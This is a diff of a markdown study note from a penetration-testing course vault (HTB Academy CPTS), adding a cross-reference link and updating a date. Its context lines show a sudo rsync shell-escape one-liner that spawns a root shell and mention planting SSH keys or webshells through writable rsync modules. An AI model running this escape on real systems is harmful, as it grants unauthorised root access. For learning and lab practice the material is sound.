@@ -20,9 +20,10 @@ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
 ```
 
 > [!note] **See also** — [[Services/File Xfer/Rsync|Rsync]] service note (daemon enumeration, anon read/write → SSH-key/webshell, module→path abuse); local-privesc context in [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]].
+> Also [[Class notes/HTB Academy/CPTS v2 (claude)/Attacking Common Services|Attacking Common Services]] (CPTS v2) — rsync module listing / download / upload.
 
 ---
 
 *Created: 2026-09-23*
-*Updated: 2026-09-23*
+*Updated: 2026-10-08*
 *Model: claude-opus-4-8*
